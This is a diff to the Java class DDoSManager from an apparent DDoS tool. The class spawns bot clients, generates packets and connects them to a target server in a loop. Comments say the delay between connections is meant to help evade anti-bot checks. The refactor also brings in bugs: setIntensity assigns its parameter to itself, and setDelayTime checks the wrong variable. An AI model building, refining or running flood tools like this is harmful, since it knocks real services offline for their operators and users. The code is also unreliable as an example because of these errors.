@@ -2,6 +2,7 @@ package src.Main.DDosSoftware.DDosLogic.Flood;
 
 import src.Main.DDosSoftware.DDosLogic.Client.Client;
 import src.Main.DDosSoftware.DDosLogic.Client.ClientManager;
+import src.Main.DDosSoftware.DDosLogic.Client.ClientPacketManager;
 import src.Main.DDosSoftware.DDosLogic.Server.ServerManager;
 import src.Main.DDosSoftware.Enums.Intensity;
 
@@ -10,42 +11,35 @@ public class DDoSManager {
      * Define how many bots you wanna flood to the server
      * this will impact your PC resources, but not a big deal
      */
-    private Intensity intensity = Intensity.LOW;
+    private static Intensity intensity = Intensity.LOW;
 
+    public static long DEFAULT_DELAY_TIME = 15;
     /*
      * The delay time by miliseconds after a bot is joined
      * this might make the anti-bot stuff harder too check
      * if they're getting SYNFlood
      */
-    private long delayTime = DEFAULT_DELAY_TIME;
-    public static long DEFAULT_DELAY_TIME = 15;
+    private static long delayTime = DEFAULT_DELAY_TIME;
 
-    public long getDelayTime() {
-        return this.delayTime;
-    }
-
-    public Intensity getIntensity() {
-        return this.intensity;
-    }
+    public static DDoSManager DDoS;
 
     // ! THINGS ARE BEGIN HERE
-    public void start() {
-        // * CREATE BOTS
-        for (int bot = 0; bot < getBotSizeBaseOnIntensity(intensity); bot++) {
-            ClientManager.createClient(bot);
-        }
+    public static void start() {
+        // * CREATE CLIENTS
+        ClientManager.createClient();
+        // * CREATE PACKETS FOR CLIENTS
+        ClientPacketManager.generatePacketForClient();
 
-        if (ServerManager.canConnect()) {
-            // * CONNECT TO THE SERVER
-            for (int index = 0; index < ClientManager.clients.size(); index++) {
+        // * CONNECT TO THE SERVER
+        for (int clientIndex = 0; clientIndex < ClientManager.clients.size(); clientIndex++) {
+            if (ServerManager.canConnect()) {
+                ClientManager.connect(clientIndex);
+            }
 
-                ClientManager.connect(ClientManager.clients.get(index), index);
+            try {
+                Thread.sleep(delayTime);
+            } catch (Exception e) {
 
-                try {
-                    Thread.sleep(delayTime);
-                } catch (Exception e) {
-
-                }
             }
         }
 
@@ -57,9 +51,16 @@ public class DDoSManager {
      * @param intensity intensity of the DDoS
      * @return the object itself
      */
-    public DDoSManager setIntensity(Intensity intensity) {
-        this.intensity = intensity;
-        return this;
+    public static void setIntensity(Intensity intensity) {
+        intensity = intensity;
+    }
+
+    public static Intensity getIntensity() {
+        return intensity;
+    }
+
+    public static long getDelayTime() {
+        return delayTime;
     }
 
     /**
@@ -69,13 +70,12 @@ public class DDoSManager {
      * @param delayTime the delay time after a bot is joined
      * @return the object itself
      */
-    public DDoSManager setDelayTime(long delayTime) {
+    public static void setDelayTime(long dTime) {
         if (delayTime < DEFAULT_DELAY_TIME) {
-            this.delayTime = DEFAULT_DELAY_TIME;
+            delayTime = DEFAULT_DELAY_TIME;
         } else {
-            this.delayTime = delayTime;
+            delayTime = dTime;
         }
-        return this;
     }
 
     public static int getBotSizeBaseOnIntensity(Intensity intense) {
